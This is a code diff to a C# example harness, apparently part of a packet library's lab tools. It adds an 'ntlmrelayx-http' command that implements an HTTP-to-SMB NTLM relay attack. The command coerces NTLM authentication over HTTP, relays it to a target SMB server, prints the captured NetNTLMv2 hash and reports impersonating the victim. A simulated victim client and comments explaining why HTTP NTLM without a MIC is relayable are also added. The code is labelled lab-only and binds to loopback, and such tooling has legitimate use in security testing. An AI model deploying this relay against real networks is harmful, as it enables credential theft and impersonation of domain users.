@@ -5,6 +5,7 @@ using DotNetPacket.Protocols.Krb5;
 using DotNetPacket.Protocols.Laps;
 using DotNetPacket.Protocols.Ldap;
 using DotNetPacket.Protocols.Ntlm;
+using DotNetPacket.Protocols.Http;
 using DotNetPacket.Protocols.Smb;
 using DotNetPacket.Protocols.Tds;
 
@@ -1471,6 +1472,65 @@ switch (args[0])
 
         try { victimTask?.Wait(5000); } catch { /* victim may error after relay completes; not fatal */ }
         return outcome.Relayed ? 0 : 1;
+    }
+
+    case "ntlmrelayx-http":
+    {
+        // ntlmrelayx.py HTTP relay server: an HTTP endpoint that coerces NTLM (WWW-Authenticate: NTLM)
+        // and relays the victim's authentication to a target SMB server. The common coerced-auth
+        // vector (PetitPotam/PrinterBug over HTTP/WebDAV). See
+        // examples/ntlmrelayx/servers/httprelayserver.py. LAB-ONLY; loopback demo as with the SMB relay.
+        if (args.Length < 2)
+        {
+            Console.Error.WriteLine("usage: ntlmrelayx-http <target-host> [listen-port=8080] [victim-user victim-pass [domain]]");
+            Console.Error.WriteLine("  demo (loopback): ntlmrelayx-http 127.0.0.1 8080 Administrator 'LabAdm1n!Pass' lab.local");
+            return 2;
+        }
+
+        string targetHost = args[1];
+        int listenPort = args.Length > 2 ? int.Parse(args[2]) : 8080;
+        bool haveVictim = args.Length >= 5;
+        string vUser = haveVictim ? args[3] : string.Empty;
+        string vPass = haveVictim ? args[4] : string.Empty;
+        string vDomain = args.Length > 5 ? args[5] : string.Empty;
+
+        using var httpServer = new HttpRelayServer(listenPort, System.Net.IPAddress.Loopback);
+        httpServer.Start();
+        Console.WriteLine($"[*] ntlmrelayx (HTTP->SMB) listening on http://127.0.0.1:{httpServer.Port}/, relaying to {targetHost}");
+        using var httpTarget = new Smb2RelayClientTarget(targetHost);
+
+        System.Threading.Tasks.Task? victimTask = null;
+        if (haveVictim)
+        {
+            Console.WriteLine($"[*] (demo) driving an HTTP victim '{vUser}' against the listener");
+            victimTask = System.Threading.Tasks.Task.Run(() => HttpNtlmVictim("127.0.0.1", listenPort, vDomain, vUser, vPass));
+        }
+        else
+        {
+            Console.WriteLine("[*] waiting for an inbound HTTP connection to relay...");
+        }
+
+        HttpRelayOutcome result = httpServer.AcceptAndRelay(httpTarget);
+        Console.WriteLine($"[*] victim {result.VictimEndpoint} ({result.RequestLine}) relayed to {targetHost}");
+        Console.WriteLine($"    relayed challenge (target's): {Convert.ToHexString(result.RelayedChallenge).ToLowerInvariant()}");
+        try
+        {
+            byte[] serverChallenge = NtlmChallenge.Parse(result.RelayedChallenge).ServerChallenge;
+            NtlmAuthenticate victimAuth = NtlmAuthenticate.Parse(result.VictimAuthenticate);
+            Console.WriteLine("[+] Captured NetNTLMv2 hash:");
+            Console.WriteLine($"    {NetNtlmv2.Format(serverChallenge, victimAuth)}");
+        }
+        catch (Exception ex)
+        {
+            Console.Error.WriteLine($"    (could not format captured hash: {ex.Message})");
+        }
+
+        Console.WriteLine(result.Relayed
+            ? $"[+] Relay SUCCEEDED: authenticated to {targetHost} as the victim (target session 0x{httpTarget.Client.SessionId:X})."
+            : $"[-] Relay failed: target returned {NtStatus.Describe(result.TargetStatus)} (0x{result.TargetStatus:X8}).");
+
+        try { victimTask?.Wait(5000); } catch { /* victim may error after relay completes; not fatal */ }
+        return result.Relayed ? 0 : 1;
     }
 
     case "get-adcomputers":
@@ -4602,6 +4662,80 @@ static string ResolveDn(DotNetPacket.Protocols.Ldap.LdapConnection ldap, string 
     return es.Count > 0 ? es[0].ObjectName : string.Empty;
 }
 
+// A minimal HTTP NTLM victim (lab demo): authenticates to the relay listener over HTTP so the whole
+// HTTP->SMB relay runs on loopback. Mirrors a browser/WebDAV client doing WWW-Authenticate: NTLM.
+static void HttpNtlmVictim(string host, int port, string domain, string user, string password)
+{
+    using var tcp = new System.Net.Sockets.TcpClient();
+    tcp.Connect(host, port);
+    using System.Net.Sockets.NetworkStream s = tcp.GetStream();
+    s.ReadTimeout = 15_000;
+    // Bare HTTP NTLM (no SPNEGO): a real browser/WebDAV client does NOT assert an NTLM MIC, since
+    // there is no SPNEGO mechListMIC to back it. This is precisely what lets an HTTP victim be relayed
+    // to SMB — the relay cannot forge a mechListMIC, so a MIC-asserting Type 3 would be rejected.
+    var ntlm = new DotNetPacket.Protocols.Ntlm.NtlmClient { IncludeMic = false };
+
+    void Get(string? authorization)
+    {
+        var sb = new System.Text.StringBuilder();
+        sb.Append("GET / HTTP/1.1\r\n").Append($"Host: {host}:{port}\r\n");
+        if (authorization is not null)
+        {
+            sb.Append("Authorization: ").Append(authorization).Append("\r\n");
+        }
+
+        sb.Append("Connection: keep-alive\r\n\r\n");
+        byte[] b = System.Text.Encoding.ASCII.GetBytes(sb.ToString());
+        s.Write(b, 0, b.Length);
+        s.Flush();
+    }
+
+    Dictionary<string, string> ReadResponse()
+    {
+        var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
+        string ReadLine()
+        {
+            var sb = new System.Text.StringBuilder();
+            int prev = -1;
+            while (true)
+            {
+                int c = s.ReadByte();
+                if (c < 0) return sb.ToString();
+                if (prev == '\r' && c == '\n') { sb.Length -= 1; return sb.ToString(); }
+                sb.Append((char)c);
+                prev = c;
+            }
+        }
+
+        ReadLine(); // status line
+        while (true)
+        {
+            string line = ReadLine();
+            if (line.Length == 0) break;
+            int colon = line.IndexOf(':');
+            if (colon > 0) headers[line[..colon].Trim()] = line[(colon + 1)..].Trim();
+        }
+
+        if (headers.TryGetValue("content-length", out string? cl) && int.TryParse(cl, out int len) && len > 0)
+        {
+            var body = new byte[len];
+            int read = 0;
+            while (read < len) { int n = s.Read(body, read, len - read); if (n <= 0) break; read += n; }
+        }
+
+        return headers;
+    }
+
+    Get(null);
+    ReadResponse();                                            // 401 WWW-Authenticate: NTLM
+    Get("NTLM " + Convert.ToBase64String(ntlm.CreateNegotiate()));
+    Dictionary<string, string> challengeHeaders = ReadResponse(); // 401 with the relayed Type 2
+    byte[] type2 = Convert.FromBase64String(challengeHeaders["WWW-Authenticate"].Substring(5).Trim());
+    DotNetPacket.Protocols.Ntlm.NtlmAuthResult auth = ntlm.CreateAuthenticate(type2, domain, user, password);
+    Get("NTLM " + Convert.ToBase64String(auth.Message));
+    ReadResponse();                                            // 200 / 401
+}
+
 static void PrintUsage()
 {
     Console.WriteLine("DotNetPacket examples (SOC lab harness)");
@@ -4659,6 +4793,7 @@ static void PrintUsage()
     Console.WriteLine("  owneredit <read|write> <host> <user> <password> <domain-fqdn> <target> [new-owner]   # owneredit: read/set an object's owner (lab)");
     Console.WriteLine("  rbcd <read|write|remove|flush> <host> <user> <password> <domain-fqdn> <delegate-to> [delegate-from]   # rbcd: msDS-AllowedToActOnBehalfOfOtherIdentity (lab)");
     Console.WriteLine("  ntlmrelayx <target-host> [listen-port] [victim-user victim-pass [domain]]   # ntlmrelayx: SMB->SMB NTLM relay (lab)");
+    Console.WriteLine("  ntlmrelayx-http <target-host> [listen-port] [victim-user victim-pass [domain]]   # ntlmrelayx: HTTP->SMB NTLM relay (lab)");
     Console.WriteLine("  rpc-services <host> <user> <password> [domain] [port]");
     Console.WriteLine("                   List installed services via svcctl REnumServicesStatusW (services.py list).");
     Console.WriteLine("  rpc-svcconfig <host> <user> <password> <service> [domain] [port]");
